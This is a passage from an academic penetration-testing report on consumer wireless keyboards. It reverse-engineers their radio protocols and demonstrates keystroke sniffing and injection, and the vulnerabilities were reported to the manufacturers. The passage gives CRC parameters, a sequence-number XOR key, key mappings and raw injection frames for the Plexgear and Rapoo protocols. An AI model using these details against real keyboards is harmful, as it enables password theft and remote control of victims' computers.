44 | Penetration test
Figure 4.33: Analog view of a single key press from the Clas Ohlson 38-6600
Figure 4.34: Demodulated view of a single key press from the Clas Ohlson
38-6600
Figure 4.35: Bitrate calculation from the Clas Ohlson 38-6600
Penetration test | 45
Figure 4.36: Protocol from the Clas Ohlson 38-6600
46 | Penetration test
Figure 4.37: Protocol from the Clas Ohlson 38-6600 - a zoomed version of
Figure 4.36
Penetration test | 47
4.1.5 Rapoo E9100M
This section describes the Rapoo E9100M and all the steps that were
conducted to gather as much information as possible about the keyboard
and how it operates. Section 4.1.5.1 covers pre-engagement and information
gathering, and Section 4.1.5.2 covers vulnerability analysis of the keyboard.
4.1.5.1 Pre-engagement & Information gathering
Rapoo E910M∗is a moderately priced keyboard with support for both
Bluetooth and a USB transceiver. The keyboard comes with no mouse or
touchpad but has function keys and can connect up to 4 different devices (3
Bluetooth and 1 transceiver) at the same time which can be switched between
using the function keys. The keyboard requires 1 AAA battery and operates
in the 2.4GHz band. The specifications promise a range of up to 10 m and
it states that the keyboard is supported from Windows XP to Windows 10 as
well as being supported by macOS, iOS, Android, and Chrome OS†.
Figure 4.38: Rapoo E9100M keyboard and box
∗https://www.rapoo-eu.com/wp-content/uploads/2021/02/
E9100M_Manual_WW_A.1.3_5602-05A07-222.pdf
†https://www.rapoo-eu.com/product/e9100m/
#specifications-anchor
48 | Penetration test
Figure 4.39: Rapoo E9100M spectrum analysis
4.1.5.2 Vulnerability Analysis
The same steps as for the previous keyboards were performed and the only
changed variable was the recording frequency . There were almost no spikes
on either side of the distinct peaks to indicate FSK but the modulation type was
still determined to be FSK since the demodulation displayed consistent data.
All other details were the same except the protocol which seemed to differ
compared to the previously analyzed keyboards. The details of the protocol
can be found in Section 4.2.2 .
Penetration test | 49
Figure 4.40: Recording key presses on the Rapoo E9100M
Figure 4.41: Analog view of the data from the Rapoo E9100M
50 | Penetration test
Figure 4.42: Analog view of a single key press from the Rapoo E9100M
Figure 4.43: Demodulated view of a single key press from the Rapoo E9100M
Figure 4.44: Bitrate calculation from the Rapoo E9100M
Penetration test | 51
Figure 4.45: Protocol from the Rapoo E9100M
52 | Penetration test
Figure 4.46: Protocol from the Rapoo E9100M - a zoomed version of
Figure 4.45
Penetration test | 53
4.1.6 Logitech MK270
This section describes the Logitech MK270 and all the steps that were
conducted to gather as much information as possible about the keyboard
and how it operates. Section 4.1.6.1 covers pre-engagement and information
gathering, and Section 4.1.6.2 covers vulnerability analysis of the keyboard.
4.1.6.1 Pre-engagement & Information gathering
Logitech K270∗is moderately priced keyboard that has been analysed in
previous research. The keyboard comes with a mouse and requires 2 AAA
batteries to operate. The product page promises a range of > 10 m and operates
in the 2.4GHz band. The keyboard has been shown to be vulnerable to
keystroke injection with the JackIt implementation†and some details of the
protocol were given in the presentation by Newlin [ 16].
Figure 4.47: Logitech K270 keyboard and box
∗https://www.logitech.com/sv-se/products/keyboards/
k270-unifying-wireless.html
†https://github.com/insecurityofthings/jackit
54 | Penetration test
Figure 4.48: Logitech K270 spectrum analysis
4.1.6.2 Vulnerability Analysis
The same steps as for the previous keyboards were performed and the only
changed variable was the recording frequency . Figure 4.48 did not show
obvious spikes indicating FSK but the modulation was once again FSK as seen
in Figure 4.52 . The bitrate was different for this keyboard and the calculations
can be seen above Figure 4.53 , the bitrate was determined to be 2Mbit s−1.
The details of the protocol can be found in Section 4.2.3 .
Penetration test | 55
Figure 4.49: Recording key presses on the Logitech K270
Figure 4.50: Analog view of the data from the Logitech K270
56 | Penetration test
Figure 4.51: Analog view of a single key press from the Logitech K270
Figure 4.52: Demodulated view of a single key press from the Logitech K270
The bitrate was determined by selecting the smallest amount of data used to
carry a single bit (assuming that each symbol carried a single bit). A selection
of 5 samples was required to transmit a single high value (1 bit) and from this,
the bitrate was calculated by substituting the number of samples for a bit into
the recorded sample rate.
Recorded sample rate: 10 000 000 samples/s
5samples = 1 bit
2 000 000 bits/s= 2 Mbit s−1
Penetration test | 57
Figure 4.53: Bitrate calculation from the Logitech K270
Figure 4.54: Protocol from the Logitech K270
58 | Penetration test
Figure 4.55: Protocol from the Logitech K270 - a zoomed version of
Figure 4.54
4.1.7 Corsair K63 Wireless
This section describes the Corsair K63 Wireless and all the steps that were
conducted to gather as much information as possible about the keyboard
and how it operates. Section 4.1.7.1 covers pre-engagement and information
gathering, and Section 4.1.7.2 covers vulnerability analysis of the keyboard.
4.1.7.1 Pre-engagement & Information gathering
Corsair K63 Wireless∗is a high end gaming keyboard with mechanical
switches. The keyboard comes with a built-in battery and can be used either
∗https://www.corsair.com/us/en/Categories/
Products/Gaming-Keyboards/Wireless-Keyboards/
K63-Wireless-Mechanical-Gaming-Keyboard-%E2%80%94-Blue-LED-%
E2%80%94-CHERRY%C2%AE-MX-Red/p/CH-9145030-NA#tab-tech-specs
Penetration test | 59
with the 2.4GHz USB dongle or over Bluetooth. The product specifications
states a range up to 10 m and response times of 1ms using the 2.4GHz USB
dongle. The quick start guide∗promises “ ...128-bit AES wireless encryption
that is automatically enabled and works to protect the wireless transmission
of your keystrokes... ” with the added ability to disable encryption for a slight
reduction in latency .
Figure 4.56: Corsair K63 Wireless keyboard and box
When the 2.4GHz to 2.5GHz spectrum was scanned there were
continuous transmissions on several frequencies observed even when buttons
were not pressed. The continuous transmissions can be seen in Figure 4.57 .
∗https://www.corsair.com/corsairmedia/sys_master/
productcontent/NA_K63_Wireless_QSG_AA.pdf
60 | Penetration test
Figure 4.57: Corsair K63 Wireless spectrum analysis
4.1.7.2 Vulnerability Analysis
The same steps as for the previous keyboards were performed and a large
amount of data could be observed being recorded, as indicated by a large
number of black lines in the recording in Figure 4.58 .
Penetration test | 61
Figure 4.58: Recording key presses on the Corsair K63 Wireless
Figure 4.59: Analog view of the data from the Corsair K63 Wireless
62 | Penetration test
Figure 4.60: Analog view of a single key press from the Corsair K63 Wireless
Figure 4.61: Demodulated view of a single key press from the Corsair K63
Wireless
The bitrate calculations were repeated for the Corsair keyboard and
resulted in a calculated bitrate of 2Mbit s−1.
Figure 4.62: Bitrate calculation from the Corsair K63 Wireless
Penetration test | 63
In the protocol view, a large number of “empty” packets could be observed
which explained the large number of transmissions. The details of the protocol
can be seen in Section 4.2.4 .
Figure 4.63: Protocol from the Corsair K63 Wireless
64 | Penetration test
Figure 4.64: Protocol from the Corsair K63 Wireless - a zoomed version of
Figure 4.63
4.1.8 iiglo MK610
This section describes the iiglo MK6100 and all the steps that were conducted
to gather as much information as possible about the keyboard and how it
operates. Section 4.1.8.1 covers pre-engagement and information gathering,
and Section 4.1.8.2 covers vulnerability analysis of the keyboard.
4.1.8.1 Pre-engagement & Information gathering
The iiglo K610∗is a moderately priced keyboard that also comes with a mouse.
The keyboard requires 2 AA batteries to operate and the manual promises a
range up to 10 m. There is a wide range of hotkeys and function keys to quickly
∗https://www.komplett.se/productmedia/52344/iiglo_wireless_
keyboard_mouse_m610_manual_redesign_outlines.pdf
Penetration test | 65
access various functions.
Figure 4.65: iiglo MK610 keyboard and box
Figure 4.66: iiglo K610 spectrum analysis
66 | Penetration test
4.1.8.2 Vulnerability Analysis
The same steps as for the previous keyboards were performed and the only
changed variable was the recording frequency . There were no clear spikes on
either side of the distinct peaks to indicate FSK but the modulation type was
still determined to be FSK since the demodulation displayed consistent data.
The bitrate calculations resulted in a bitrate of 2Mbit s−1and details of the
protocol can be found in Section 4.2.5 .
Figure 4.67: Recording key presses on the iiglo K610
Penetration test | 67
Figure 4.68: Analog view of the data from the iiglo K610
Figure 4.69: Analog view of a single key press from the iiglo K610
Figure 4.70: Demodulated view of a single key press from the iiglo K610
68 | Penetration test
Figure 4.71: Bitrate calculation from the iiglo K610
Figure 4.72: Protocol from the iiglo K610
Penetration test | 69
Figure 4.73: Protocol from the iiglo K610 - a zoomed version of Figure 4.72
4.1.9 Exibel 38-8940
This section describes the Exibel 38-8940 and all the steps that were conducted
to gather as much information as possible about the keyboard and how it
operates. Section 4.1.9.1 covers pre-engagement and information gathering,
and Section 4.1.9.2 covers vulnerability analysis of the keyboard.
4.1.9.1 Pre-engagement & Information gathering
Exibel 38-8940∗is a very basic wireless keyboard from Clas Ohlson AB that
comes with no mouse or touchpad. The keyboard features the most basic
function keys and requires 1 AAA battery to operate. The product page states a
range of up to 10 m and compatibility with Windows 10, Windows 8, Windows
∗https://www.clasohlson.com/se/Tr%C3%A5dl%C3%
B6st-tangentbord-Exibel%2C-wireless/p/Pr388940000
70 | Penetration test
7, and Chrome OS.
Figure 4.74: Exibel 38-8940 keyboard and box
Figure 4.75: Exibel 38-8940 spectrum analysis
Penetration test | 71
4.1.9.2 Vulnerability Analysis
The same steps as for the previous keyboards were performed and the only
changed variable was the recording frequency . The spikes in the spectral view
almost seem to indicate some type of single sideband mode but once again
FSK the modulation type was determined to be FSK since the demodulation
displayed consistent data. The bitrate calculations resulted in a bitrate of
2Mbit s−1and details of the protocol can be found in Section 4.2.6 .
Figure 4.76: Recording key presses on the Exibel 38-8940
72 | Penetration test
Figure 4.77: Analog view of the data from the Exibel 38-8940
Figure 4.78: Analog view of a single key press from the Exibel 38-8940
Figure 4.79: Demodulated view of a single key press from the Exibel 38-8940
Penetration test | 73
Figure 4.80: Bitrate calculation from the Exibel 38-8940
Figure 4.81: Protocol from the Exibel 38-8940
74 | Penetration test
Figure 4.82: Protocol from the Exibel 38-8940 - a zoomed version of
Figure 4.81
4.1.10 Razer BlackWidow V3 Pro
This section describes the Razer BlackWidow V3 Pro and all the steps that
were conducted to gather as much information as possible about the keyboard
and how it operates. Section 4.1.10.1 covers pre-engagement and information
gathering, and Section 4.1.10.2 covers vulnerability analysis of the keyboard.
4.1.10.1 Pre-engagement & Information gathering
The Razer BlackWidow v3 Pro∗is a high-end gaming keyboard with
mechanical switches. The keyboard comes with a built-in battery and can
be used either with the 2.4GHz USB dongle or over Bluetooth with up to 3
∗https://www.razer.com/gaming-keyboards/
razer-blackwidow-v3-pro
Penetration test | 75
different devices. The keyboard uses Razer’s Hyperspeed∗technology which
they boast is 3 times faster than any other wireless gaming technology (which
would result in response times of maximum1
3ms if the claims of Corsair are
also true).
Figure 4.83: Razer BlackWidow V3 Pro keyboard and box
When the 2.4GHz to 2.5GHz spectrum was scanned there were
continuous transmissions on several frequencies observed even when buttons
were not pressed. These continuous transmissions can be seen in Figure 4.84 .
∗https://www.razer.com/razer-hyperspeed-wireless
76 | Penetration test
Figure 4.84: Razer BlackWidow V3 Pro spectrum analysis
4.1.10.2 Vulnerability Analysis
The same steps as for the previous keyboards were performed and a massive
amount of data could be observed being recorded, as indicated by the large
block of black lines in the recording in Figure 4.85 .
Penetration test | 77
Figure 4.85: Recording key presses on the Razer BlackWidow V3 Pro
The analog view also shows the massive amount of data being transmitted
and no information is obtainable without zooming in on the captured samples.
Figure 4.86: Analog view of the data from the Razer BlackWidow V3 Pro
78 | Penetration test
Figure 4.87: Analog view of a single key press from the Razer BlackWidow
V3 Pro
Figure 4.88: Demodulated view of a single key press from the Razer
BlackWidow V3 Pro
The bitrate calculations were repeated for the Razer keyboard and resulted
in a calculated bitrate of 2Mbit s−1.
Penetration test | 79
Figure 4.89: Bitrate calculation from the Razer BlackWidow V3 Pro
The details of the protocol can be seen in Section 4.2.4 .
Figure 4.90: Protocol from the Razer BlackWidow V3 Pro
80 | Penetration test
Figure 4.91: Protocol from the Razer BlackWidow V3 Pro - a zoomed version
of Figure 4.90
4.1.11 Summary
T o summarise all findings in Section 4.1 the table below describes some of the
most important findings.
Penetration test | 81
T able 4.1: Summary of first stage analysis. All of the keyboards used FSK as
their modulation.
V endor Model Bitrate Protocol
(Mbps)
Plexgear Mediatrack Edge X 1 Plexgear protocol Section 4.2.1
Plexgear KM-Silent 1 Plexgear protocol Section 4.2.1
Deltaco TB-122 1 Plexgear protocol Section 4.2.1
Clas Ohlson 38-6600 1 Plexgear protocol Section 4.2.1
Rapoo E9100M 1 Rapoo protocol Section 4.2.2
Logitech MK270 2 Logitech protocol Section 4.2.3
Corsair K63 Wireless 2 Corsair protocol Section 4.2.4
iiglo MK610 2 iiglo protocol Section 4.2.5
Exibel 38-8940 2 Exibel protocol Section 4.2.6
Razer BlackWidow V3 Pro 2 Razer protocol Section 4.2.7
4.2 Protocol specific vulnerability analysis,
Exploitation, Post Exploitation and
Reporting
This section addresses the vulnerability analysis and all the subsequent steps of
the penetration test for each of the different protocols. The Plexgear protocol
is detailed in Section 4.2.1 , the Rapoo protocol in Section 4.2.2 , the Logitech
protocol in Section 4.2.3 , the Corsair protocol in Section 4.2.4 , the iiglo
protocol in Section 4.2.5 , the Exibel protocol in Section 4.2.6 , and the Razer
protocol in Section 4.2.7 .
4.2.1 Plexgear Protocol
This section describes the rest of the penetration testing steps for the Plexgear
protocol that was not covered in any of the subsections in Section 4.1 . This
includes vulnerability analysis of the protocol (Section 4.2.1.1 ), exploitation
of the protocol (Section 4.2.1.2 ), post exploitation details (Section 4.2.1.3 ),
and finally what was reported (Section 4.2.1.4 ).
82 | Penetration test
4.2.1.1 Vulnerability Analysis
From the first stage of the vulnerability analysis, it was observed that multiple
keyboards used the same protocol and the details of all of them could be
combined to form a more complete understanding of the underlying protocol.
The first step in understanding the protocol was to observe where the preamble
ended and the actual content of the data started. This was completed by
searching for patterns of repeating values such as 0xAA or0x55 as these are
some common preamble values∗. When the rough location of the preamble
had been determined further sequences of the protocol were examined. It was
noted that in the middle of the packet a nibble consisting of a single 2was
always present. It was also noted that all keypresses of a single button always
produced the same pattern of 0xdbXX , such as0xdb48 for the letter A. The
nibble between the 2and the0xdbXX was changing between every packet
and this was determined to most likely be a form of sequence number so the
receiver of the transmission can be aware of re-transmissions and not relay the
same information multiple times to the host computer. The rest of the data
after the0xdbXX bytes consisted of 2 bytes of data changing between key-
presses, this was, therefore, most likely some type of checksum to verify the
validity of the transmitted data and is covered in detail later in this section.
The part of the data between the preamble and the 2was presumed to be the
destination address of the USB dongle as there is no other information that is
consistent enough and large enough to be the address.
The information from the multiple keyboards using the same protocol
could be combined and further information could be obtained by cross-
referencing each other. It was noted that the checksum was the same
for keypresses with the same sequence number and data ( i.e.,0xdbXX ).
In Figure 4.92 the checksum can be observed to be the same for the first two
rows (marked 2 and 29) even though the address is different. By examining
rows 4 and 5 (marked 63 and 84) the checksum can be observed to be different
from the first two rows even though the sequence number of them is the same,
this indicates that the data is a part of the checksum calculation. By comparing
rows 3 and 6 (marked 34 and 87) to rows 4 and 5 where the data stays the same
and the sequence number differs, the checksum can be observed to still change,
this indicates that the sequence number is a part of the checksum calculations
as well. Accidental usage of the touchpad on the Plexgear Mediatrack Edge
X showed frames almost identical to the keystrokes with the static 2replaced
∗These two values represent alternating bits and thus can be used by the receiver to
synchronize its clock to the transmitter’s clock. This synchronization pattern typically ends
with a start of frame symbol, where the final two bits are identical.
Penetration test | 83
with1so this was determined to most likely be some type of type field but
at the same time irrelevant to the keyboard analysis since the type field was a
consistent2for all keyboard transmissions.
Figure 4.92: Examples of the same checksum appearing in situations where
the address differs. Y ellow: Presumed address, Green: T ype and sequence
number, Red: Data, Blue: Checksum
The protocol stack can thus far be described with the data in Figure 4.93 .
The checksum calculations are made using the T ype, Sequence, and Data
fields and are then stored in the Checksum field. The Address is used for
identification by the dongle and the Checksum is used for checking data
validity .
0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31
Address T ype Sequence
Data Checksum
Figure 4.93: The Plexgear protocol
T o figure out how the checksums were calculated the tool CRC RevEng∗
was used. Several transmissions were fed into the tool with parameters set to
calculate a 16-bit CRC. The tool was initially not able to find any algorithm but
several attempts with different settings were made. Great effort was put into
figuring out the CRC algorithm and eventually the tool was used with only the
byte order of the checksum swapped and an algorithm was found which can be
∗https://reveng.sourceforge.io/
84 | Penetration test
seen in Figure 4.94 . The checksum is calculated using the CRC-16 algorithm
with0x1021 as the polynomial and 0xd83f as the initialization.
Figure 4.94: The execution and results of CRC RevEng that give a correct
checksum algorithm for the Plexgear protocol. The first argument given to the
program specifies a CRC of 16 bits, the second that we want to search for the
correct algorithm. The parameters given to the program starting with “22db”,
“21db”, and “26db” are different transmissions that the keyboard has sent.
The last 4 characters of these have also been swapped. This can be seen by
comparing the first of these parameters with the first transmission in fig. 4.92
The sequence numbers for all captured frames of the Plexgear protocol
were compared and the pattern of sequence numbers was observed to be
repeating and consistent. The sequence numbers were worked on with the
static 2 as a part of the it to keep the size to a single byte, the pattern consisted
of 14 repeating values of 0x28 0x29 0x2e 0x2f 0x2c 0x2d 0x22
0x23 0x20 0x21 0x26 0x27 0x24 0x25 . The pattern repeats with
pairs of numbers that are following each other, for example 0x22 0x23 and
0x28 0x29 . In binary, this would correspond to the first bit flipping between
0 and 1 but the sequence was not increasing in an otherwise linear way . An
attempt was made in trying to XOR the sequence number with some value to
get a linear sequence, and we already knew that a potential XOR key would
have the first bit set to 0. A brute force attempt was made using CyberChef∗
and a key was found with a linearly increasing pattern, which can be seen in
Figure 4.95 , but instead of starting at 0, it starts at 2. The key was the hex value
2a which means that a possible implementation of a simple for-loop modulo
14, with 2 added and XORed with 0x2a would give us a correct repeating
sequence number as well as the type field correctly set.
∗https://gchq.github.io/CyberChef/
Penetration test | 85
Figure 4.95: Brute force attempt at recovering a linear sequence of numbers from the captured sequence numbers.
86 | Penetration test
The data part of the protocol was consistent between keypresses of the
same key and a mapping of the keyboard was made. By using the Crazyradio
P A (see Section 3.4.1 for a description) with the RFStorm nRF24LU1+
Research Firmware [ 15] and setting the radio into generic promiscuous mode
with the bitrate set to the now knows bitrate of 1Mbit s−1and the prefix
address to a known address of one of the Plexgear protocol keyboards we
can consistently and accurately capture keystrokes from a keyboard. Generic
promiscuous mode tells the radio to not filter any values based on checksums
and just forward everything to the computer. Using these settings and holding
down one key at a time of the keyboard we can map each key to the value
being sent from the keyboard. The output from holding down the ’ A ’ key can
be seen in Figure 4.96 and a consistent 0xdb48 can be observed. Releasing
any button triggers a 0x5b instead of a 0xdb which presumably means a key-
up event.
Figure 4.96: The output of the Crazyradio P A in generic promiscuous mode
with the ’ A ’ key held down
A crude mapping of different keys can be observed in Figure 4.97 and the
key mapping probably correlates to the underlying keyboard matrix circuit in
some way as groups of keys have the same first nibble of data, indicated by
color in the image.
Penetration test | 87
Figure 4.97: The different keys highlighted in bold and their corresponding data value when sent from the keyboard
88 | Penetration test
All parts of the protocol were now known and work on exploitation could
commence.
4.2.1.2 Exploitation
A simple keylogger was constructed by listening to transmissions from
a certain keyboard and then translating the keycodes using the values in
Figure 4.97 . The keylogger uses the Crazyradio P A in generic promiscuous
mode since the address of the targeted device is already known and we do not
care about checksums just yet. A small example can be seen in Figure 4.98
where the string “secret password” was typed on the keyboard attached to the
victim computer.
Figure 4.98: Sniﬀing keystrokes on a Plexgear keyboard with the string “secret
password” typed
T o test the keystroke injection capabilities, the Crazyradio was set to
continuously send 0x29 0xDB 0x48 0xD8 0xC1 to the address of the
targeted keyboard and the expectation was that this would then print a
single ’ A ’ on the victim’s computer. T o take this to the next step the
RFStorm nRF24LU1+ Research Firmware was modified to include checksum
calculations to be able to identify keyboards using the Plexgear protocol
without knowing their address. The support for checksum calculations was
added to the non-generic promiscuous mode and thus the radio could now
Penetration test | 89
listen to all traﬀic and send the correct frames to the host computer when found.
The code can be found in Appendix A.1 .
This enabled the ability to use the JackIt framework mentioned in
Section 2.3.3 . The framework uses pre-programmed fingerprints to identify
the keyboard type and then crafts a payload corresponding to the identified
keyboard. The JackIt code was modified to add support for the Plexgear
protocol and automatic payloads could now be crafted against any victim using
the Plexgear protocol. The code can be found in Appendix A.2 .
4.2.1.3 Post Exploitation
The keylogging proof of concept demonstrated the ability to listen in on what
was being typed and thus the answer to the first subquestion of the initial
problem statement, i.e., Is it possible to listen in on what is being typed? , is
Y es .
The keystroke injection with the JackIt framework demonstrates the ability
to type on the victim’s computer and as a result of this, the second subquestion
of the initial problem statement, i.e., Is it possible to send keystrokes without
physical access to the keyboard? , is Y es .
Therefore, any usage of the Plexgear protocol should be considered
insecure as the keystroke injection gives an attacker full control of the targeted
system and the same privileges as the user of the computer whose keystrokes
have been sniffed.
Both proofs of concepts demonstrate the weaknesses of the Plexgear
protocol and all keyboards using it.
4.2.1.4 Reporting
The vulnerabilities were reported to the manufacturers of all of the tested
devices which use the Plexgear protocol.
4.2.2 Rapoo Protocol
This section describes the rest of the penetration testing steps for the Rapoo
protocol that was not covered in any of the subsections in Section 4.1 . This
includes vulnerability analysis of the protocol (Section 4.2.2.1 ), exploitation
of the protocol (Section 4.2.2.2 ), post exploitation details (Section 4.2.2.3 ),
and finally what was reported (Section 4.2.2.4 ).
90 | Penetration test
4.2.2.1 Vulnerability Analysis
From Figure 4.45 we got an overview of the protocol but the details could be
better observed by looking at the individual bits of the transmitted data. The
most interesting bits were the ones that increment and repeat in a predictable
pattern as these can give an idea of the protocol we are dealing with. In
Figure 4.99 the bits with a red background can be observed to be repeatedly
counting from 0 to 3 while the surrounding bits seem to have no correlation
with the counting. The bits in blue were constantly set to 1 and this 2 bit field
of counting and a 1 bit field with a constant value of 1 gave enough information
to assume that the underlying protocol is most likely the Enhanced Shockburst
Protocol (described below).
Figure 4.99: A zoomed-in view of some of the bits during the Rapoo
transmission.
The Enhanced Shockburst Protocol is the protocol previously researched
by Newlin [ 16]. It is the protocol used by the non-generic promiscuous mode
in the RFStorm nRF24LU1+ Research Firmware [ 15] and is the protocol that
JackIt originally used. The protocol is used by the nRF24 chips∗and the full
details can be found in the datasheet of the nRF24LU+ [ 24]. The frame format
described in the datasheet can be found in Figure 4.100
∗https://www.nordicsemi.com/Products/nRF24-series
Penetration test | 91
Preamble 1 byte Address 3-5 byte Packet Control Field 9 bitCRC 1-2
byte
Figure 4.100: Enhanced Shockburst Protocol details
The 16-bit CRC defined in the datasheet is described as having 0x1021 as
the polynomial and 0xffff as the initialization. The payload length is defined
in the Packet Control Field which is shown in Figure 4.101 .
Payload length 6 bit PID 2 bit NO_ACK 1 bit
Figure 4.101: Enhanced Shockburst Protocol Packet Control Field
The Packet Control field contains the payload length which changes based
on the amount of data that needs to be sent, the PID (Packet Identification)
which is a 2-bit sequence number that increases every time a packet is sent,
and the NO_ACK flag. The NO_ACK is a 1-bit flag telling the receiver of the
packet that the packet should not be “auto acknowledged”. The nRF24 chips
have the ability to automatically send an acknowledgment packet to tell the
transmitter that the packet was received and the NO_ACK flag disables this if
set.
The PID and NO_ACK flags were discovered when analyzing the Rapoo
protocol and further analysis of the length and checksum indicated that the
Rapoo protocol is built upon the Enhanced Shockburst protocol.
The last step in understanding the Rapoo protocol was to figure out how
the data part was built. The address and bitrate for the Rapoo keyboard were
configured in the Crazyradio P A and it was set into generic promiscuous mode .
The ’ A ’ key was held down and the result is shown in Figure 4.102 .
92 | Penetration test
Figure 4.102: The output of the Crazyradio P A in generic promiscuous mode
with the ’ A ’ key held down
The data was observed to contain the value 0x00 0x04 which is very
similar to the USB Human Interface device keyboard key codes definition
according to the USB standard [ 25]. A very simplified explanation can be
thought of as the first byte containing modifier keys and the following bytes
containing the key presses. The keycode for the key ’ A ’ is 0x04 which is
what was observed and several other keys were pressed to confirm this theory .
The codes for ’S’ and ’D’ are 0x16 and0x07 respectively and these could be
observed when pressing and releasing ’ A ’ , ’S’, and ’D’ on the keyboard and
can be seen in Figure 4.103 . Pressing any modifier key also set flags in the
first bit in accordance to page 55 of the Device Class Definition for Human
Interface Devices [ 26].
Penetration test | 93
Figure 4.103: The output of the Crazyradio P A in generic promiscuous mode
when the ’ A ’ , ’S’, and ’D’ keys are pressed and released
The first byte of each packet of data also contained the value 0x32
whenever a key was pressed. If no key was pressed then the value 0x34
0x00 was observed instead indicating an empty packet and no key should
be sent to the computer, in contrast to the key up values that were seen in the
Plexgear protocol.
4.2.2.2 Exploitation
A simple keylogger was constructed by decoding the Enhanced Shockburst
Protocol data that was being sent to grab the length of the data payload. By
using the length all USB key codes were extracted from each packet and
therefore the full Rapoo protocol was recovered. By using the USB HID
documentation [ 25] all keys could be translated to their respective buttons and
a clear text view of the entered data could be recovered. A small example can
be seen in Figure 4.104 where the string “secret password” was typed on the
keyboard attached to the victim’s computer.
94 | Penetration test
Figure 4.104: Sniﬀing keystrokes on a Rapoo keyboard with the string “secret
password” typed
Initial keystroke injection testing was performed by telling the Crazyradio
P A to continuously send 0x32 0x00 0x04 to the address of the keyboard.
This prompted a large stream of ’ A ’s to be written on the victim computer
which indicated keystroke injection was successful. The next step was to add
fingerprints and payload creation to JackIt to support the Rapoo protocol and
once this was complete, automatic payload creation could be performed and
any victim using the Rapoo protocol could now be attacked. The code can be
found in Appendix A.3 .
Penetration test | 95
4.2.2.3 Post Exploitation
The keylogging proof of concept demonstrated the ability to listen in on what
was being typed and thus the answer to the first subquestion of the initial
problem statement, i.e., Is it possible to listen in on what is being typed? , is
Y es .
The keystroke injection with the JackIt framework demonstrates the ability
to type on the victim’s computer and as a result of this the second subquestion
of the initial problem statement, i.e., Is it possible to send keystrokes without
physical access to the keyboard? , is Y es .
Therefore, any usage of the Rapoo protocol should be considered insecure
as the keystroke injection gives an attacker full control of the targeted system
and the same privileges as the user of the computer whose keystrokes have
been sniffed.
Both implementations demonstrate the weaknesses in the Rapoo protocol
and all keyboards using it.
4.2.2.4 Reporting
The vulnerabilities were reported to Rapoo.
4.2.3 Logitech Protocol
This section describes the rest of the penetration testing steps for the Logitech
protocol that was not covered in any of the subsections in Section 4.1 . This
includes vulnerability analysis of the protocol (Section 4.2.3.1 ), exploitation
of the protocol (Section 4.2.3.2 ), post-exploitation details (Section 4.2.3.3 ),
and finally what was reported (Section 4.2.3.4 ).
4.2.3.1 Vulnerability Analysis
As this keyboard has previously been shown to be vulnerable and research has
been previously done on it, there were no groundbreaking new discoveries that
could be achieved with this protocol. The Logitech protocol is built upon the
Enhanced Shockburst protocol and some details on it are described by Newlin
in the Mousejack research [ 16]. The data part of the Enhanced Shockburst
protocol is partly encrypted which makes key sniﬀing diﬀicult (however it
might be possible∗) but keystroke injection has been successfully performed.
∗https://nvd.nist.gov/vuln/detail/CVE-2019-13052
96 | Penetration test
4.2.3.2 Exploitation
The JackIt software already had support for some Logitech keyboards and the
program was employed against the keyboard and showed successful keystroke
injection on the victim’s computer.
4.2.3.3 Post Exploitation
Since the vulnerability was previously known it cannot be used to answer the
research question, but it showed that keyboards that are still being sold have
known vulnerabilities in them. It may be possible to manually update the
firmware of the keyboard to mitigate the vulnerability but that is not something
a consumer should expect when purchasing a brand new keyboard.∗
4.2.3.4 Reporting
Since the vulnerability is previously known, the manufacturer was not
informed. The manufacturer has previously been informed and the advisories
can be found on GitHub†and there is also an entry in the (U. S.) National
Vulnerability Database‡.
4.2.4 Corsair Protocol
This section describes the rest of the penetration testing steps for the Corsair
protocol that was not covered in any of the subsections in Section 4.1 . This
includes vulnerability analysis of the protocol (Section 4.2.4.1 ), exploitation
of the protocol (Section 4.2.4.2 ), post-exploitation details (Section 4.2.4.3 ),
and finally what was reported (Section 4.2.4.4 ).
4.2.4.1 Vulnerability Analysis
As seen in Section 4.1.7.2 , the Corsair protocol was observed to transmit
large numbers of small packets even when no keys were pressed. When
these packets were analyzed, it was concluded that they utilized the Enhanced
Shockburst Protocol based on the present packet control field and the CRC
matching that of the Enhanced Shockburst protocol. This meant that similar
∗https://support.logi.com/hc/en-us/community/posts/
360032078393-Logitech-Response-to-Research-Findings
†https://github.com/BastilleResearch/mousejack/tree/master/
doc/advisories
‡https://nvd.nist.gov/vuln/detail/CVE-2016-10761
Penetration test | 97
to the Rapoo protocol, the Corsair protocol is built upon the Enhanced
Shockburst protocol, and therefore the address, packet control field, and CRC
are the same as described in Figure 4.100 .
The data part of the Corsair protocol is what distinguishes it from the
Enhanced Shockburst protocol and the larger packets that were sent when a
key was pressed were analysed in order to reverse engineer how the protocol
works.
Using the Crazyradio P A in generic promiscuous mode with the bitrate set
to2Mbit s−1the keys ’ A ’ , ’S’, and ’D’ were pressed again with all the other
packets filtered out and can be seen in Figure 4.105 .
Figure 4.105: The data portion of the output of the Crazyradio P A in generic
promiscuous mode when the keys ’ A ’ , ’S’, and ’D’ buttons were pressed in
succession on the Corsair K63 Wireless.
As observed in Figure 4.105 the data output for the different key presses
are very similar with only the first nibble of the 6thbyte having any observable
difference between the different outputs. This indicated that some bit flipping
was taking place to indicate what key was being pressed and to figure this out
the output of the different keys was XORed with each other. For example:
0xCE01CA9DAD8D39B03C7417E8F15701BB01172D39 (A)
⊕0xCE01CA9DADED39B03C7417E8F15701BB01172D39 (S)
=0x0000000000600000000000000000000000000000
The resulting difference is 0x60 in the 6thbyte and60 in binary is
represented as 0110 0000 .
0xCE01CA9DAD8D39B03C7417E8F15701BB01172D39 (A)
98 | Penetration test
⊕0xCE01CA9DAD2D39B03C7417E8F15701BB01172D39 (D)
=0x0000000000A00000000000000000000000000000
The resulting difference is 0xA0 in the 6thbyte andA0 in binary is
represented as 1010 0000 .
0xCE01CA9DADED39B03C7417E8F15701BB01172D39 (S)
⊕0xCE01CA9DAD2D39B03C7417E8F15701BB01172D39 (D)
=0x0000000000C00000000000000000000000000000
The resulting difference is 0xC0 in the 6thbyte andC0 in binary is
represented as 1100 0000 .
From these experiments, we could gather enough information to
understand the bitmasking of the keys by looking at what position always
stayed 1 when XORing the different keys together.
T able 4.2: XOR results of ’ A ’ , ’S’, and ’D’ presses
Key 1 Key 2 XOR value of 6thbyte
A S 0110 0000
A D 1010 0000
S D 1100 0000
T able 4.3: Bitmask for ’ A ’ , ’S’, and ’D’
Key Mask Binary Mask Hex
A 0010 0000 20
S 0100 0000 40
D 1000 0000 80
The information gathered was enough to figure out the bitmasking of the
different keys and by taking the complete data portion of a known keypress
and XORing the 6thbyte with the identified bitmask for the corresponding key
